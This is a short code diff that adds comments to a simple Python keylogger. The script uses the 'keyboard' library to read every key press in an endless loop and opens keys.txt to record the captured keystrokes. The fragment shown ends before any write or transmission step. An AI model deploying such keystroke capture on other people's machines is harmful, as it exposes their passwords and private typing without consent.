@@ -1,7 +1,9 @@
 import keyboard
 
+# create a file to record the keystrokes being captured
 f = open("keys.txt", "w")
 
+# constantly loop through all the characters and check if they are currently being pressed or not
 while True:
     rk = keyboard.read_event()
     key = rk.name
